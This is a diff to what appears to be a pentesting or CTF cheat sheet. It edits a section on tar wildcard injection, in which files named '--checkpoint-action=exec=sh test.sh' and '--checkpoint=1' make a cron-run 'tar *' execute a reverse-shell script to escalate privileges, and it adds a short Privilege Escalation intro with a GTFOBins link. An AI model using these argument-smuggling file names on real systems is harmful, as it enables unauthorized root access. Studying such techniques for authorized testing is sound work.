@@ -272,17 +272,19 @@ The wildcard `*` character allows to manage multiple data. For example, it could
 - Create the two input parameter files:
 
       echo "" > "--checkpoint-action=exec=sh test.sh"
-      echo "" > --checkpoint=1
+      echo "" > "--checkpoint=1"
 
-- Wait for the reverse shell to be executed via cronjob (hoping for privilege escalation), otherwise execute: `tar archive.tar *`
+Finally wait for the reverse shell to be executed via cronjob (hoping for privilege escalation), otherwise execute: `tar archive.tar *`
 
 ## Docker exploitation
 
-
-
 # Privilege Escalation
 
+It is the art of getting root permission on a target machine. Once an attacker has properly escalaged his privileges on a victim machine, he has complete control over the system.
+
 ## Linux PrivEsc
+
+Several privilege escalation vectors using misconfigured built-in Unix binaries are available at [GTFOBins](https://gtfobins.github.io/).
 
 ## Windows PrivEsc
 
